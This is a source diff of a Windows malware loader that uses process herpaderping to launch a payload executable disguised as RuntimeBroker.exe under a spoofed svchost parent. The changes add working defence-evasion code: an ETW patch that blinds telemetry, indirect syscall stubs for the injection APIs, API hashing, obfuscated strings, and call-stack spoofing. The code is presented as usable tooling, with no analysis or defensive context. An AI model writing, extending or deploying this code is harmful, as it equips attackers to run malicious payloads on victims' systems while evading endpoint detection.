@@ -3,6 +3,9 @@
 #include <tlhelp32.h>
 #include "CWLInc.h"
 #include "StackSpoof.h"
+#include "obfstr.h"
+#include "api_hash.h"
+#include "syscall.h"
 
 // Default payload path - can be overridden at compile time
 // Usage: msbuild ... /p:PreprocessorDefinitions="PAYLOAD_PATH=L\"D:\\custom\\path.exe\""
@@ -10,9 +13,23 @@
 #define PAYLOAD_PATH L"C:\\temp\\payload64.exe"
 #endif
 
+// B1 — ETW Patch (T1562.006): patch ntdll!EtwEventWrite → xor eax,eax; ret
+// Suppresses ETW events for NtCreateSection / NtCreateProcessEx / NtWriteVirtualMemory
+// Must be called before any NT API invocation to prevent DC0021 telemetry
+static void PatchEtw()
+{
+	HMODULE hNtdll = GetNtdllBase();
+	PVOID pEtw = RESOLVE_API(hNtdll, EtwEventWrite);
+	if (!pEtw) return;
+	DWORD old = 0;
+	VirtualProtect(pEtw, 4, PAGE_EXECUTE_READWRITE, &old);
+	memcpy(pEtw, "\x33\xC0\xC3", 3);  // xor eax,eax; ret
+	VirtualProtect(pEtw, 4, old, &old);
+}
+
 static HANDLE GetNonJobParent()
 {
-	const wchar_t* targets[] = { L"svchost.exe", L"wininit.exe", NULL };
+	const wchar_t* targets[] = { OBFWSTR(L"svchost.exe"), OBFWSTR(L"wininit.exe"), NULL };
 	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 	if (hSnap == INVALID_HANDLE_VALUE) return GetCurrentProcess();
 	PROCESSENTRY32W pe = { sizeof(pe) };
@@ -61,13 +78,14 @@ BYTE *GetPayloadBuffer(OUT size_t &p_size)
 ULONG_PTR GetEntryPoint(HANDLE hProcess, BYTE *payload, PROCESS_BASIC_INFORMATION pbi)
 {
 	// Functions Declaration
-	_RtlImageNtHeader pRtlImageNtHeader = (_RtlImageNtHeader)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlImageNtHeader");
+	HMODULE hNtdll = GetNtdllBase();
+	_RtlImageNtHeader pRtlImageNtHeader = (_RtlImageNtHeader)RESOLVE_API(hNtdll, RtlImageNtHeader);
 	if (pRtlImageNtHeader == NULL)
 	{
 		perror("[-] Couldn't found API RtlImageNTHeader...\n");
 		exit(-1);
 	}
-	_NtReadVirtualMemory pNtReadVirtualMemory = (_NtReadVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtReadVirtualMemory");
+	_NtReadVirtualMemory pNtReadVirtualMemory = (_NtReadVirtualMemory)RESOLVE_API(hNtdll, NtReadVirtualMemory);
 	if (pNtReadVirtualMemory == NULL)
 	{
 		perror("[-] Couldn't found API NtReadVirtualMemory...\n");
@@ -92,53 +110,67 @@ ULONG_PTR GetEntryPoint(HANDLE hProcess, BYTE *payload, PROCESS_BASIC_INFORMATIO
 
 BOOL Herpaderping(BYTE *payload, size_t payloadSize)
 {
-	// Functions Declartion
-	_NtCreateSection pNtCreateSection = (_NtCreateSection)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateSection");
+	HMODULE hNtdll = GetNtdllBase();
+
+	// B2 — Indirect Syscalls: build stubs for the 5 injection-critical Nt* APIs.
+	// Each stub: mov r10,rcx; mov eax,<SSN>; movabs r11,<gadget>; jmp r11
+	// The gadget (syscall;ret) lives inside ntdll .text, so EDR sees the syscall
+	// as originating from ntdll, not from our PE or stub page.
+	if (!InitSyscallPool(hNtdll))
+	{
+		perror("[-] Failed to initialize indirect syscall pool\n");
+		exit(-1);
+	}
+	INDIRECT_SYSCALL(_NtCreateSection,        pNtCreateSection,        NtCreateSection);
+	INDIRECT_SYSCALL(_NtCreateProcessEx,      pNtCreateProcessEx,      NtCreateProcessEx);
+	INDIRECT_SYSCALL(_NtAllocateVirtualMemory,pNtAllocateVirtualMemory,NtAllocateVirtualMemory);
+	INDIRECT_SYSCALL(_NtWriteVirtualMemory,   pNtWriteVirtualMemory,   NtWriteVirtualMemory);
+	INDIRECT_SYSCALL(_NtCreateThreadEx,       pNtCreateThreadEx,       NtCreateThreadEx);
+	SealSyscallPool();  // flip pool to PAGE_EXECUTE_READ — no persistent RWX page
+
 	if (pNtCreateSection == NULL)
 	{
-		perror("[-] Couldn't find API NtCreateSection...\n");
+		perror("[-] Couldn't resolve SSN for NtCreateSection\n");
 		exit(-1);
 	}
-	_NtCreateProcessEx pNtCreateProcessEx = (_NtCreateProcessEx)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateProcessEx");
 	if (pNtCreateProcessEx == NULL)
 	{
-		perror("[-] Couldn't find API NtCreateProcessEx...\n");
+		perror("[-] Couldn't resolve SSN for NtCreateProcessEx\n");
 		exit(-1);
 	}
-	_NtQueryInformationProcess pNtQueryInformationProcess = (_NtQueryInformationProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
+	if (pNtAllocateVirtualMemory == NULL)
+	{
+		perror("[-] Couldn't resolve SSN for NtAllocateVirtualMemory\n");
+		exit(-1);
+	}
+	if (pNtWriteVirtualMemory == NULL)
+	{
+		perror("[-] Couldn't resolve SSN for NtWriteVirtualMemory\n");
+		exit(-1);
+	}
+	if (pNtCreateThreadEx == NULL)
+	{
+		perror("[-] Couldn't resolve SSN for NtCreateThreadEx\n");
+		exit(-1);
+	}
+
+	// Non-injection APIs: keep as EAT-walk resolution (not syscall-hooked in practice)
+	_NtQueryInformationProcess pNtQueryInformationProcess = (_NtQueryInformationProcess)RESOLVE_API(hNtdll, NtQueryInformationProcess);
 	if (pNtQueryInformationProcess == NULL)
 	{
 		perror("[-] Couldn't find API NtQueryInformationProcess...\n");
 		exit(-1);
 	}
-	_NtCreateThreadEx pNtCreateThreadEx = (_NtCreateThreadEx)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx");
-	if (pNtCreateThreadEx == NULL)
-	{
-		perror("[-] Couldn't find API NtCreateThreadEx\n");
-		exit(-1);
-	}
-	_RtlCreateProcessParametersEx pRtlCreateProcessParametersEx = (_RtlCreateProcessParametersEx)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlCreateProcessParametersEx");
+	_RtlCreateProcessParametersEx pRtlCreateProcessParametersEx = (_RtlCreateProcessParametersEx)RESOLVE_API(hNtdll, RtlCreateProcessParametersEx);
 	if (pRtlCreateProcessParametersEx == NULL)
 	{
 		perror("[-] Couldn't find API RtlCreateProcessParametersEx\n");
 		exit(-1);
 	}
-	_RtlInitUnicodeString pRtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlInitUnicodeString");
+	_RtlInitUnicodeString pRtlInitUnicodeString = (_RtlInitUnicodeString)RESOLVE_API(hNtdll, RtlInitUnicodeString);
 	if (pRtlInitUnicodeString == NULL)
 	{
 		perror("[-] Couldn't find API RtlInitUnicodeString \n");
-		exit(-1);
-	}
-	_NtWriteVirtualMemory pNtWriteVirtualMemory = (_NtWriteVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
-	if (pNtWriteVirtualMemory == NULL)
-	{
-		perror("[-] Couldn't find API NtWriteVirtualMemory\n");
-		exit(-1);
-	}
-	_NtAllocateVirtualMemory pNtAllocateVirtualMemory = (_NtAllocateVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
-	if (pNtAllocateVirtualMemory == NULL)
-	{
-		perror("[-] Couldn't find API NtAllocateVirtualMemory...");
 		exit(-1);
 	}
 	HANDLE hTemp;
@@ -177,7 +209,7 @@ BOOL Herpaderping(BYTE *payload, size_t payloadSize)
 	// CreateSection with temp file (SPOOFED CALL)
 	// SEC_IMAGE flag is set
 	{
-		StackSpoofer spoofer("kernel32.dll");
+		StackSpoofer spoofer(OBFSTR("kernel32.dll"));
 		spoofer.Activate();
 		status = pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, 0, PAGE_READONLY, SEC_IMAGE, hTemp);
 		spoofer.Deactivate();
@@ -190,7 +222,7 @@ BOOL Herpaderping(BYTE *payload, size_t payloadSize)
 	// Create Process with section (SPOOFED CALL)
 	HANDLE hParent = GetNonJobParent();
 	{
-		StackSpoofer spoofer("kernel32.dll");
+		StackSpoofer spoofer(OBFSTR("kernel32.dll"));
 		spoofer.Activate();
 		status = pNtCreateProcessEx(&hProcess, PROCESS_ALL_ACCESS, NULL, hParent,
 									0, hSection, NULL, NULL, FALSE);
@@ -205,8 +237,7 @@ BOOL Herpaderping(BYTE *payload, size_t payloadSize)
 	// Token fixup: NtCreateProcessEx inherits token from parent (svchost.exe via GetNonJobParent),
 	// reassign the calling process token so ghost runs with our identity (SYSTEM if via EfsPotato)
 	{
-		_NtSetInformationProcess pNtSetInformationProcess = (_NtSetInformationProcess)GetProcAddress(
-			GetModuleHandleA("ntdll.dll"), "NtSetInformationProcess");
+		_NtSetInformationProcess pNtSetInformationProcess = (_NtSetInformationProcess)RESOLVE_API(hNtdll, NtSetInformationProcess);
 		if (pNtSetInformationProcess)
 		{
 			HANDLE hToken = NULL;
@@ -247,9 +278,10 @@ BOOL Herpaderping(BYTE *payload, size_t payloadSize)
 
 	// Set Process Parameters
 	wchar_t targetFilePath[MAX_PATH] = {0};
-	lstrcpy(targetFilePath, L"C:\\Windows\\System32\\RuntimeBroker.exe");
+	lstrcpyW(targetFilePath, OBFWSTR(L"C:\\Windows\\System32\\RuntimeBroker.exe"));
 	pRtlInitUnicodeString(&uTargetFilePath, targetFilePath);
-	wchar_t dllDir[] = L"C:\\Windows\\System32";
+	wchar_t dllDir[MAX_PATH] = {0};
+	lstrcpyW(dllDir, OBFWSTR(L"C:\\Windows\\System32"));
 	UNICODE_STRING uDllDir = {0};
 	pRtlInitUnicodeString(&uDllPath, dllDir);
 	status = pRtlCreateProcessParametersEx(&processParameters, &uTargetFilePath, &uDllPath,
@@ -262,7 +294,7 @@ BOOL Herpaderping(BYTE *payload, size_t payloadSize)
 	SIZE_T paramSize = processParameters->EnvironmentSize + processParameters->MaximumLength;
 	PVOID paramBuffer = processParameters;
 	{
-		StackSpoofer spoofer("kernel32.dll");
+		StackSpoofer spoofer(OBFSTR("kernel32.dll"));
 		spoofer.Activate();
 		status = pNtAllocateVirtualMemory(hProcess, &paramBuffer, 0, &paramSize,
 										  MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
@@ -273,7 +305,7 @@ BOOL Herpaderping(BYTE *payload, size_t payloadSize)
 		exit(-1);
 	}
 	{
-		StackSpoofer spoofer("kernel32.dll");
+		StackSpoofer spoofer(OBFSTR("kernel32.dll"));
 		spoofer.Activate();
 		status = pNtWriteVirtualMemory(hProcess, processParameters, processParameters,
 									   processParameters->EnvironmentSize + processParameters->MaximumLength, NULL);
@@ -285,14 +317,15 @@ BOOL Herpaderping(BYTE *payload, size_t payloadSize)
 	}
 	// Getting Remote PEB address
 	remotePEB = (PEB *)pbi.PebBaseAddress;
-	if (!WriteProcessMemory(hProcess, &remotePEB->ProcessParameters, &processParameters, sizeof(PVOID), NULL))
+	SIZE_T written = 0;
+	if (!WriteProcessMemory(hProcess, &remotePEB->ProcessParameters, &processParameters, sizeof(PVOID), &written))
 	{
 		exit(-1);
 	}
 
 	// Create and resume thread (SPOOFED CALL)
 	{
-		StackSpoofer spoofer("kernel32.dll");
+		StackSpoofer spoofer(OBFSTR("kernel32.dll"));
 		spoofer.Activate();
 		status = pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess,
 								   (LPTHREAD_START_ROUTINE)entryPoint, NULL, FALSE, 0, 0, 0, 0);
@@ -308,6 +341,7 @@ BOOL Herpaderping(BYTE *payload, size_t payloadSize)
 
 int main()
 {
+	PatchEtw();
 	size_t payloadSize;
 	BYTE *payloadBuffer = GetPayloadBuffer(payloadSize);
 	BOOL isSuccess = Herpaderping(payloadBuffer, payloadSize);
